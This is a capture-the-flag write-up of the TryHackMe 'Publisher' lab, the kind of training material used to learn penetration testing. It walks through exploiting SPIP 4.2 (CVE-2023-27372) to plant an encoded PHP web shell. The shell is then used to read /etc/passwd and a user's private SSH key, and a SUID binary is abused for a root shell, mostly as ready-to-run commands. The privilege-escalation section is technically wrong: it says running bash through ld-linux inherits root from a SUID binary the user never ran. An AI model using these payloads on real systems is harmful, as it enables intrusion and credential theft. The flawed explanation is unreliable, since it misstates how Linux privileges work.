---
title: Publisher - TryHackMe
date: 2025-03-30
---

<script setup>
    import RoomCard from "../../../.vitepress/components/thm/RoomCard.vue";
</script>

<RoomCard
    roomName="Publisher"
    roomIcon="/ctf/tryhackme/publisher/icon-room.png"
    roomLink="https://tryhackme.com/room/publisher"
    roomLevel="EASY"
    roomTechnology="Linux"
/>

## Challenge description

The "Publisher" CTF machine is a simulated environment hosting some services. Through a series of enumeration techniques, including directory fuzzing and version identification, a vulnerability is discovered, allowing for Remote Code Execution (RCE). Attempts to escalate privileges using a custom binary are hindered by restricted access to critical system files and directories, necessitating a deeper exploration into the system's security profile to ultimately exploit a loophole that enables the execution of an unconfined bash shell and achieve privilege escalation.

## Enumeration

### Nmap

We began the enumeration phase with a comprehensive Nmap scan to identify open ports and running services:

```bash
nmap -sC -sV -v -A -oN nmap.txt 10.10.119.143
```

**Nmap Output:**

```bash
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.10 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Publisher's Pulse: SPIP Insights & Tips
|_http-server-header: Apache/2.4.41 (Ubuntu)
```

The scan revealed two open ports:

- **Port 22 (SSH):** OpenSSH 8.2p1, likely for remote administration.
- **Port 80 (HTTP):** Apache 2.4.41 serving a web application titled "Publisher's Pulse", likely a CMS.

## Web Application Enumeration

### Manual Inspection

Navigating to `http://10.10.119.143` displayed a content-based website. The layout and presentation hinted at the use of a CMS.

![Homepage](/ctf/tryhackme/publisher/home.png)

### Directory Brute Forcing

We used `gobuster` to enumerate hidden directories:

```bash
gobuster dir -u http://10.10.119.143 -w /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt -x php,txt,html -o gobuster.txt
```

**Key Findings:**

```bash
/spip                 (Status: 301) [Size: 313] [--> http://10.10.119.143/spip/]
```

Enumerating the `/spip` directory, we find the following:

```bash
gobuster dir -u http://10.10.119.143/spip -w /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt -x php,txt,html -o gobuster.txt
```

**Key Findings:**

```bash
/LICENSE              (Status: 200) [Size: 35147]
/config               (Status: 301) [Size: 320] [--> http://10.10.119.143/spip/config/]
/ecrire               (Status: 301) [Size: 320] [--> http://10.10.119.143/spip/ecrire/]
/htaccess.txt         (Status: 200) [Size: 4307]
/index.php            (Status: 200) [Size: 8145]
/local                (Status: 301) [Size: 319] [--> http://10.10.119.143/spip/local/]
/prive                (Status: 301) [Size: 319] [--> http://10.10.119.143/spip/prive/]
/spip.php             (Status: 200) [Size: 8143]
...
```

Particularly, the presence of `/spip`, `/ecrire`, and `/config` indicates the web application is running **SPIP**, an open-source publishing system.

### Identifying the CMS and Version

Reviewing `/htaccess.txt` revealed the CMS in use:

![SPIP Version](/ctf/tryhackme/publisher/htaccess.png)

From the file, we confirmed that **SPIP version 4.2** is being used.

## Vulnerability Identification & Exploitation

### Remote Code Execution via SPIP

Using Exploit-DB, we found a known vulnerability affecting SPIP v4.2 (CVE-2023-27372) that enables **Remote Code Execution (RCE)** via a crafted request.

**Reference:** [Exploit-DB #51536](https://www.exploit-db.com/exploits/51536)

We used the following command to upload a PHP web shell using the RCE vector:

```bash
python3 exploit.py -u http://10.10.119.143/spip -c "echo PD89YCRfR0VUWzBdYD8+ | base64 -d > shell.php"
```

This injected a base64-decoded PHP shell into the web root.

### Web Shell Access

The web shell was accessed at:

```
http://10.10.119.143/spip/shell.php?0=id
```

![PHP Shell](/ctf/tryhackme/publisher/web-shell.png)

We confirmed code execution as the `www-data` user.

## Gaining User Access

### Local Enumeration

Using the web shell, we read `/etc/passwd` to enumerate local users:

```bash
curl "http://10.10.119.143/spip/shell.php?0=cat%20/etc/passwd"
```

**Result:**

```bash
think:x:1000:1000::/home/think:/bin/sh
```

### SSH Key Discovery

We discovered a private SSH key for the `think` user:

```bash
curl "http://10.10.119.143/spip/shell.php?0=cat%20/home/think/.ssh/id_rsa" > think_id_rsa
chmod 600 think_id_rsa
```

Using the key, we successfully logged in via SSH:

```bash
ssh -i think_id_rsa think@10.10.119.143
```

**Access confirmed:**

```bash
think@publisher:~$ id
uid=1000(think) gid=1000(think) groups=1000(think)
```

User flag located in `/home/think/user.txt`.

## Privilege Escalation

### SUID Binary Enumeration

We searched for binaries with the SUID bit set:

```bash
find / -type f -perm -u=s 2>/dev/null
```

**Notable finding:**

```bash
/usr/sbin/run_container
```

This binary is owned by `root` and has the SUID bit set, meaning it executes with **elevated privileges** (UID 0).

### Inspecting the SUID Binary

We ran `strings` to determine what the binary is executing:

```bash
strings /usr/sbin/run_container
```

**Relevant Output:**

```bash
...
/bin/bash
/opt/run_container.sh
...
```

This shows the binary executes `/opt/run_container.sh`, a Bash script designed to manage Docker containers.

Inspecting the script:

```bash
ls -l /opt/run_container.sh
```

**Output:**

```bash
-rwxrwxrwx 1 root root 1715 Jan 10  2024 /opt/run_container.sh
```

While the script appears to be **world-writable**, attempts to modify it using a standard shell as `think` fail:

```bash
echo "bash -p" >> /opt/run_container.sh
# Permission denied
```

### Why Can't We Modify the Script as `think`?

Despite the `777` permissions, **modern Linux systems implement protections like `fs.protected_regular`**, which prevent **non-owner users from modifying world-writable files owned by other users**. This is a mitigation against common privilege escalation vectors.

So, even though `think` appears to have write access, the kernel blocks the write due to the file's **ownership by root**.

### Bypassing Restrictions Using `ld-linux` and `bash -p`

To bypass this limitation, we leveraged the fact that the SUID binary (`run_container`) calls Bash, and we invoked it manually with preserved privileges using the dynamic loader:

```bash
/lib64/ld-linux-x86-64.so.2 /bin/bash
```

This method works because:

- It spawns a shell in a way that **preserves the SUID binary’s effective UID (root)**.
- When used with `bash -p`, it tells Bash **not to drop privileges**, allowing us to act as root.

Then, using that elevated shell:

```bash
echo "bash -p" >> /opt/run_container.sh
```

This succeeded because we were now executing as `root` due to inherited privileges.

### Exploiting the Modified Script

Finally, we executed the SUID binary:

```bash
run_container
```

Despite some missing functions in the script (e.g., `validate_container_id`), the appended `bash -p` command at the end of the script executed, granting us a root shell:

```bash
bash-5.0# id
uid=1000(think) gid=1000(think) euid=0(root) egid=0(root) groups=0(root),1000(think)
```

The root flag is located in the `/root/root.txt` file.
